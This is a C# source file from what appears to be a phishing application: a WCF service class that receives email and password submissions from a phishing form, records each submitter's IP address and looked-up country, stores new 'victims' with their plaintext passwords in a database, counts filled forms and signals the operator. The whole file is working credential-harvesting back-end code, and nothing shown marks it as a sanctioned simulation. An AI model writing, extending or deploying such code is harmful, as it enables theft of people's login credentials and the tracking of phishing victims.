using Common;
using Contracts;
using PhishingApp.Commands;
using PhishingApp.Database;
using PhishingApp.Helpers;
using PhishingApp.Model;
using System;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceModel.Web;

namespace PhishingApp.Service
{
    public class FormDataService : IFormMessage
    {
        public static event Action<Victim> OnFormFilled;
        private readonly VictimService _victimService;
        private readonly WebsiteService _websiteService;

        FormDataService()
        {
            PhishingAppDbContext dbContext = new PhishingAppDbContext();
            _victimService = new VictimService(dbContext);
            _websiteService = new WebsiteService(dbContext);
        }

        public async void ReceiveData(FormData formData)
        {
            var context = WebOperationContext.Current;
            var properties = context.IncomingRequest.Headers;

            string ipAddress = context.IncomingRequest.Headers["X-Forwarded-For"];

            if (string.IsNullOrEmpty(ipAddress))
            {
                var endpointProperty = OperationContext.Current.IncomingMessageProperties[RemoteEndpointMessageProperty.Name] as RemoteEndpointMessageProperty;

                ipAddress = endpointProperty?.Address;

                if (ipAddress == "::1")
                {
                    ipAddress = "127.0.0.1";
                }
            }

            string country = IpCountryLookupService.Instance.Lookup(ipAddress);

            var existingVictim = await _victimService.ExistsVictimWithEmail(formData.Email);

            if (!existingVictim)
            {
                var newVictim = await _victimService.AddNewVictim(formData.Email, formData.Password, formData.Timestamp, ipAddress, country);

                await _websiteService.IncrementFormsFilled(1);

                OnFormFilled.Invoke(newVictim);
            }
        }

        public void HandleOptions()
        {
        }
    }
}
